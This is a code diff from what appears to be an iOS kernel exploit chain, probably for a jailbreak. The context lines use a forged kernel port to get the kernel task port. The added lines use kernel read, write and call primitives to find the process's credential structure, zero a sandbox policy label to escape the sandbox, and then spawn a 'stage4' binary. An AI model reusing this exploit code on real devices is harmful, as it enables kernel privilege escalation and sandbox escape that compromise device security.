@@ -100,6 +100,7 @@ typedef struct {
 		kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
 		kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
 		mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
+		int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
 	} userland_funcs;
 } offsets_t;
 
@@ -541,11 +542,25 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
     }
     LOG("got kernel task port: %x", kernel_task);
 
+	// we have the task address in our_task_addr
+	// now we need to read back bsd_info and then go from there to ucread and zero cr_label->p_perpolicy[1]
+	uint64_t our_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, our_task_addr));
+	uint64_t our_ucred = kread64(our_proc + 0x100);
+	uint64_t our_label = kread64(our_ucred + 0x78);
+	kwrite64(our_label + 0x10,0x0);
+
+	// spawn the other bin
+	uint64_t pid;
+	offsets->userland_funcs.posix_spawn(&pid,"/bootstrap/test/stage4",NULL,NULL,NULL,NULL);
+
+	LOG("finally spawned stage 4 what a ride");
+
 out:
 	fakeport->ip_bits = 0x0;
     fakeport->ip_kobject = 0x0;
 	offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);
 
+	// exit call
 	__asm__(
 			"movz x0, 0x0\n"
 			"movz x16, 0x1\n"
